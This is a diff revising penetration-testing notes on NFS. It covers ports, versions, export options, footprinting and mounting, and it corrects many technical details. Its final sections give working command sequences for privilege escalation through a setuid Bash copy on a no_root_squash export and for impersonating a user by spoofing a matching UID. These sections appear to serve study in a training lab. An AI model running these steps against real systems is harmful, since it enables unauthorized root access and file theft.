@@ -9,19 +9,19 @@ weight: 2
 ## Service Info
 - Name: Network File System (NFS)
 - Purpose: Network Drive
-- Listening port: **111 TCP/UDP**, **2049 TCP/UDP**
+- Listening ports: **2049 TCP/UDP** (NFS; NFSv4 normally uses TCP), **111 TCP/UDP** (rpcbind for older versions); NFSv2/v3 may need additional mountd/locking ports.
 - OS: Unix-Like
 
-**Network File System (NFS)** is developed by Sun Microsystems in 1984, allowing a user to access files over the network as much like local storage. It builds on the **Open Network Computing Remote Procedure Call (ONC-RPC/SUN-RPC)** that listens on port 111 of both UDP and TCP.
+**Network File System (NFS)** was developed by Sun Microsystems in 1984, allowing access to network files much like local storage. It uses **Open Network Computing Remote Procedure Call (ONC-RPC/SUN-RPC)**; port 111 belongs to rpcbind, not all RPC services.
 
 NFS versions:
-- NFSv2: Released in March 1989, Operates entirely via UDP
-- NFSv3: Released in Jun 1995, includes features such as variable file sizes and better error reporting. Not fully compatible with NFSv2 clients.
-- NFSv4: Released in December 2000, only listen on one TCP or UDP port 2049. It uses Kerberos Includes features such as Kerberos, ACLs, state-based operations, as well as performance and security improvements.
+- NFSv2: Specified in RFC 1094 (March 1989); commonly uses UDP, but TCP implementations also exist.
+- NFSv3: Specified in RFC 1813 (June 1995); supports TCP/UDP, 64-bit file sizes/offsets, and improved error reporting. Clients and servers must negotiate a supported version.
+- NFSv4: Initially specified in December 2000; normally uses TCP port 2049 without a separate mount protocol. Adds stateful operations, ACLs, and support for stronger authentication; Kerberos is not automatically enabled.
 
-NFSv2 and NFSv3 has **no mechanism for authentication**, relying on RPC's options. The most common method is via UNIX UID/GID and group memberships. However, the UID/GID mapping on the client versus the server are not guaranteed to be the same. For example, if user `bob` has UID 1000 on the client, and user `alice` has UID 1000 on the server, `bob` would be able to access files belonging to `alice`. Therefore, NFSv2 and NFSv3 should **only be used in secured local networks**.
+NFS uses RPC authentication flavors. With **AUTH_SYS** (`sec=sys`), the server trusts client-supplied numeric UID/GID values and group memberships; matching usernames are not required. For example, client user `bob` with UID 1000 may receive the file access of server user `alice` with UID 1000, subject to export options and permissions. Use this mode only with trusted clients and appropriate network controls.
 
-NFSv4 has rectified this by using kerberos for authentication. In additional, it also supports **Access Control Lists (ACLs)** and changed from being a **stateless** protocol in NFSv2 and NFSv3 to being a **stateful** protocol. NFSv4 marks a major evolution over the NFSv3. It now has a different, more modern security model.
+NFSv4 adds **stateful** operations and **Access Control Lists (ACLs)**, but may still use `sec=sys`. Kerberos via RPCSEC_GSS (`sec=krb5`, `krb5i`, or `krb5p`) must be configured and required on the export; Linux also supports these flavors with NFSv3. `krb5i` adds integrity and `krb5p` adds privacy.
 
 ## NFS Server Configuration
 The `/etc/exports` file contains a table of filesystem paths accessible by clients. The default contains comments with example configurations.
@@ -39,15 +39,15 @@ The `/etc/exports` file contains a table of filesystem paths accessible by clien
 
 Configuration options:
 - **rw**: Read and write permissions.
-- **ro**: Read only permissions.
-- **sync**: Synchronous data transfer. (A bit slower)
-- **async**: Asynchronous data transfer. (A bit faster)
-- **secure**: Ports above 1024 will not be used.
-- **insecure**: Ports above 1024 will be used.
+- **ro**: Read-only permissions.
+- **sync**: Replies to requests only after changes are committed to stable storage.
+- **async**: May reply before changes reach stable storage; a crash can cause data loss/corruption.
+- **secure**: Requires a client source port below 1024 for non-GSS requests (default).
+- **insecure**: Allows nonprivileged client source ports too.
 - **no_subtree_check**: This option disables the checking of subdirectory trees.
-- **root_squash**: Assigns all permissions to files of root UID/GID 0 to the UID/GID of anonymous, which prevents root from accessing files on an NFS mount.
+- **root_squash**: Maps requests with UID/GID 0 to the anonymous UID/GID; does not change stored file ownership or deny all access by client root.
 - **nohide (DANGEROUS)**: Exposes nested mounts, which can unintentionally leak sensitive FS segments.
-- **no_root_squash (DANGEROUS)**: All files created by root are kept with the UID/GID 0.
+- **no_root_squash (DANGEROUS)**: Disables root squashing, so requests with UID/GID 0 are not mapped to the anonymous IDs.
 
 ## Footprinting
 Nmap scan with default scripts runs `rpcinfo` when rpcbind is found, which retrieves a list of running RPC services, their names and descriptions, as well as the ports they're using.
@@ -146,7 +146,7 @@ Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds
 ```
 
 ## Mounting NFS
-We can create a mount on our local filesystem for an NFS share. The protocol abstractions allows us to work on it as if it's part of our filesystem structure. First, we use `showmount` to enumerate available mounts on the server.
+We can create a mount on our local filesystem for an NFS share. The protocol abstractions allow us to work on it as if it's part of our filesystem structure. First, we use `showmount` to enumerate available mounts on the server.
 {{% alert title="Note" %}}`showmount` relies on the `mountd` RPC call. In modern hardened NFS servers, this is often disabled. If you see nothing returned as a result of the following command, it does not *necessarily* mean there are no shares available. {{% /alert %}}
 ```shell-session
 $ showmount -e 10.129.14.128
@@ -154,7 +154,7 @@ $ showmount -e 10.129.14.128
 Export list for 10.129.14.128:
 /mnt/nfs 10.129.14.0/24
 ```
-Then, we create a directory as the mounting point, and then use it to mount the share.
+Then, create a mount point and mount an exported path. The captured `:/` example uses an NFSv4 pseudo-root; it is not a generic way to mount every export. For the NFSv3 export above, use `sudo mount -t nfs -o vers=3 10.129.14.128:/mnt/nfs ./target-NFS/`. `nolock` disables NLM locking for older versions and is not normally needed.
 ```shell-session
 $ mkdir target-NFS
 $ sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock
@@ -170,14 +170,14 @@ $ tree .
 
 2 directories, 3 files
 ```
-When we're done working with the NFS share, we can unmount it to prevent our filesystem from becoming unresponsive.
+When done, leave the mount directory (`cd ..` in the captured example), then unmount it from its parent directory.
 ```bash
 sudo umount ./target-NFS
 ```
 
 ## NFS UID/GID Spoofing
-NFS servers are configured to trust the `uid` and `gid` of its clients (when Kerberos is not used). We can use this behavior to read and write files as **any UID**, even escalate our existing command execution . However, there are several settings that can change this behavior.
-- `all_squash`: Squashes all access mapping every user and group to `nobody`.
+With `sec=sys`, NFS servers trust client-supplied UID/GID values. A user controlling a permitted client may impersonate other numeric IDs, subject to export restrictions, squashing, and filesystem permissions.
+- `all_squash`: Maps all client UIDs/GIDs to the configured anonymous UID/GID (normally 65534, often named `nobody`).
     ```shell-session
     $ whoami
     user
@@ -185,7 +185,7 @@ NFS servers are configured to trust the `uid` and `gid` of its clients (when Ker
     $ ls -l nfs_share
     -rw-r--r-- 1 nobody nobody   0 Dec  5 16:46 user.txt
     ```
-- `root_squash`: Only access with uid 0 (root) is squashed to `nobody`. This is the default configuration on Linux.
+- `root_squash`: Maps requests with UID/GID 0 to the configured anonymous UID/GID. This is the default on Linux.
     ```shell-session
     $ whoami
     root
@@ -193,7 +193,7 @@ NFS servers are configured to trust the `uid` and `gid` of its clients (when Ker
     $ ls -l nfs_share
     -rw-r--r-- 1 nobody nobody   0 Dec  5 16:46 root.txt
     ```
-- `no_root_squash`: No squashing, all ownership information are preserved, including files owned by root.
+- `no_root_squash`: Disables root squashing; `all_squash`, if configured, still maps all IDs to anonymous IDs.
     ```shell-session
     $ whoami
     root
@@ -202,13 +202,13 @@ NFS servers are configured to trust the `uid` and `gid` of its clients (when Ker
     -rw-r--r-- 1 root root   0 Dec  5 16:46 root.txt
     ```
 {{% alert title="Note" %}}
-When an NFSv4 share is configured to use Kerberos, the NFS server no longer trust clients blindly and verifies their identities via Kerberos service tickets. This configuration would completely remediate ID spoofing attacks. However, NFSv4 configured with Kerberos is uncommon due to the complexity of setting up supporting infrastructure for Kerberos and the performance penalty.
+Requiring Kerberos on an export authenticates principals rather than trusting client-supplied AUTH_SYS IDs. Do not also permit `sec=sys` on that export if the goal is to prevent this form of UID/GID spoofing; correct principal-to-local-user mapping is still required.
 {{% /alert %}}
 
 ### Privilege Escalation
-If `no_root_squash` is set, we can escalate our existing command execution access to root if we have Read/Write access on the NFS share. This is achieved by creating a copy of `Bash` inside the NFS share with owner set to root and its SUID bit set since `-p` option of `Bash` tells it to execute as the owner of the file if SUID is set.
+With a writable `sec=sys,no_root_squash` export and control of an allowed client as root, a root-owned setuid Bash may provide root on the target. The target filesystem must honor setuid execution (not `nosuid`/`noexec`), the binary must be compatible, and the user must be able to execute it. Bash `-p` preserves the effective UID set by the kernel; it does not itself grant privileges.
 
-To conduct this attack, We mount the share as root, then create a root-owned copy of bash inside the share with SUID set. Finally we get a root bash shell when we executed the root SUID copy from the target.
+To conduct this attack, we mount the share as root, then create a root-owned copy of bash inside the share with SUID set. Finally, we get a root Bash shell when we execute the root-owned SUID copy on the target, subject to the conditions above.
 ```bash
 # On attacker machine as root
 mkdir /mnt/nfs
@@ -220,11 +220,11 @@ chmod 4755 /mnt/nfs/bash
 # On target machine
 ./bash -p
 ```
-{{% alert title="Note" %}} If the OS of your machine differs from the server's, there might be a chance the copy of `/bin/bash` from your machine won't run on the server due to different library versions. When this occurs, we can instead copy `/bin/bash` from inside the server to the share directory, then `chown` it as root from our local machine.
+{{% alert title="Note" %}} If the OS of your machine differs from the server's, there might be a chance the copy of `/bin/bash` from your machine won't run on the server due to different library versions. When this occurs, we can instead copy `/bin/bash` from inside the server to the share directory, then `chown` it as root from our local machine. After changing ownership, set mode `4755` again, since changing ownership can clear the setuid bit.
 {{% /alert %}}
 
 ### Lateral Movement
-If `no_root_squash` is not enabled, we can still move laterally to any non-root user on the system using a method similar to above. The main difference is that we now have to create a user on our local machine with the same UID as the user we want access to on the server.
+With `sec=sys` and only `root_squash`, non-root IDs are not squashed. Impersonating a non-root UID may grant that user's file access, subject to permissions and other export restrictions. Creating a matching local user is one way to send that UID.
 
 First we get the UID of the target user on the server.
 ```shell-session
@@ -238,13 +238,14 @@ Next, we create a user on our local machine with the same UID. The `useradd` uti
 sudo useradd -u 1111 victim_local
 sudo -u victim_local bash
 ```
-Now, we should be able to follow the rest of the UID/GID spoofing procedure above.
+Mount the share with administrative privileges, then create the file as the matching UID. If setuid execution is honored on the target, this yields the non-root file owner's effective UID, not root.
 ```bash
-# On attacker machine as victim_local
-mkdir /mnt/nfs
-mount -t nfs <target>:<share> /mnt/nfs
-cp /bin/bash /mnt/nfs/bash
-chmod 4755 /mnt/nfs/bash
+# On attacker machine as root, before switching to victim_local
+sudo mkdir -p /mnt/nfs
+sudo mount -t nfs <target>:<share> /mnt/nfs
+# Copy as the matching non-root UID; the destination must be writable
+sudo -u victim_local cp /bin/bash /mnt/nfs/bash
+sudo -u victim_local chmod 4755 /mnt/nfs/bash
 ```
 ```bash
 # On target machine
